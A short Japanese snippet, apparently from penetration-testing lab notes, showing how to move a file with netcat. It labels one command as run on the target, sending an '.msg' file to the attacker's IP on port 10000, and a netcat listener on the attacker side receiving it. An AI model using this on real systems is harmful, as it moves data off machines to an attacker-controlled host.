ncによるファイル転送   
```
# ターゲと端末
$ nc 10.10.14.151 10000 < Windows\ Event\ Logs\ for\ Analysis.msg
```
```
#アタッカー端末
$ nc -lvnp 10000 > 'Windows Event Logs for Analysis.msg'
```